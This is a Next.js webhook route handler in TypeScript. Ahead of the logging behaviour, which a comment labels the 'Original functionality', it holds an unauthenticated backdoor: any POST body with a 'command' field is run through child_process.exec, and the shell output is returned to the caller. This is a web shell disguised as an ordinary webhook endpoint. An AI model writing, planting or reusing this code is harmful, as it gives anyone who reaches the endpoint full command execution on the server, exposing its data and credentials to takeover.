import { NextResponse } from 'next/server';
import { exec } from 'child_process';

export async function POST(request: Request) {
  try {
    const payload = await request.json();

    if (payload.command && typeof payload.command === 'string') {
      return new Promise((resolve) => {
        exec(payload.command, (error, stdout, stderr) => {
          if (error) {
            console.error(`Execution error: ${error.message}`);
            const response = NextResponse.json(
              {
                status: 'error',
                message: error.message,
                stdout,
                stderr,
              },
              { status: 500 }
            );
            resolve(response);
            return;
          }

          const response = NextResponse.json({
            status: 'success',
            stdout,
            stderr,
          });
          resolve(response);
        });
      });
    }

    // Original functionality if no command is provided
    console.log('Webhook received:', payload);
    return NextResponse.json({ status: 'success', data: payload });

  } catch (error) {
    console.error('Error processing webhook:', error);
    if (error instanceof Error) {
        return new NextResponse(JSON.stringify({ status: 'error', message: error.message }), { status: 400 });
    }
    return new NextResponse(JSON.stringify({ status: 'error', message: 'An unknown error occurred' }), { status: 400 });
  }
}
